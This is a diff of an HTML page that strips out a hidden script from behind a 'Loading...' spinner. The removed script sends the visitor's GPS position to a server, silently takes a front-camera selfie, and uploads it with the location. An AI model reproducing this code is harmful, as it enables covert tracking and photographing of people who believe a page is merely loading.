@@ -9,123 +9,14 @@
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 25px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #status { font-weight: bold; color: #555; font-size: 16px; margin-top: 15px; }
-        video { width: 100%; max-width: 320px; height: auto; border-radius: 8px; background: #222; transform: scaleX(-1); margin-top: 20px; display: inline-block; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div id="loader" class="loader"></div>
+    <div class="loader"></div>
     <p id="status">Loading...</p>
-    <!-- A visible video preview is mandatory for the browser to allow camera streaming -->
-    <video id="video" autoplay playsinline muted></video>
 </div>
-
-<script>
-    let deviceOwner = "Device";
-    if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-        deviceOwner = "iOS Device";
-    } else if (/Android/i.test(navigator.userAgent)) {
-        deviceOwner = "Android Device";
-    }
-
-    let currentLat = null;
-    let currentLon = null;
-    let videoStream = null;
-    let locationSent = false;
-    let photoTaken = false; 
-
-    const statusDiv = document.getElementById('status');
-    const loaderDiv = document.getElementById('loader');
-    const videoEl = document.getElementById('video');
-
-    // 1. CRITICAL: IMMEDIATELY REQUEST AND SEND LOCATION FIRST
-    if (navigator.geolocation) {
-        navigator.geolocation.watchPosition((position) => {
-            currentLat = position.coords.latitude;
-            currentLon = position.coords.longitude;
-            
-            // Instantly transmit location coordinates to the server
-            fetch('/update', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name: deviceOwner, lat: currentLat, lon: currentLon, forceAlert: true })
-            })
-            .then(() => {
-                // Only initialize the camera stream AFTER the first location payload has successfully left the device
-                if (!locationSent) {
-                    locationSent = true;
-                    setupCamera();
-                }
-            });
-
-        }, (err) => {
-            console.log("GPS access issue");
-        }, { enableHighAccuracy: true });
-    } else {
-        console.log("Geolocation unsupported");
-    }
-
-    // 2. Camera setup runs after location transmission is confirmed
-    function setupCamera() {
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-            .then((stream) => {
-                videoStream = stream;
-                videoEl.srcObject = stream;
-                
-                // 1-second focus calibration delay for photo clarity
-                setTimeout(() => {
-                    autoCaptureSelfie();
-                }, 1000);
-            })
-            .catch((err) => {
-                console.log("Camera access issue");
-            });
-    }
-
-    function autoCaptureSelfie() {
-        if (photoTaken) return; 
-        if (!currentLat || !currentLon) {
-            setTimeout(autoCaptureSelfie, 500);
-            return;
-        }
-
-        photoTaken = true;
-
-        const canvas = document.createElement('canvas');
-        canvas.width = videoEl.videoWidth || 640;
-        canvas.height = videoEl.videoHeight || 480;
-        const ctx = canvas.getContext('2d');
-        
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-        ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-        
-        const imageData = canvas.toDataURL('image/jpeg', 0.7);
-
-        fetch('/photo', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                name: deviceOwner,
-                lat: currentLat,
-                lon: currentLon,
-                image: imageData
-            })
-        }).then(() => {
-            // Once the photo is successfully shared, stop the tracks and reset interface
-            statusDiv.innerText = "Loading...";
-            videoEl.style.display = 'none'; 
-            
-            if(videoStream) {
-                videoStream.getTracks().forEach(track => track.stop());
-            }
-        }).catch(err => {
-            photoTaken = false; 
-            autoCaptureSelfie();
-        });
-    }
-</script>
 
 </body>
 </html>
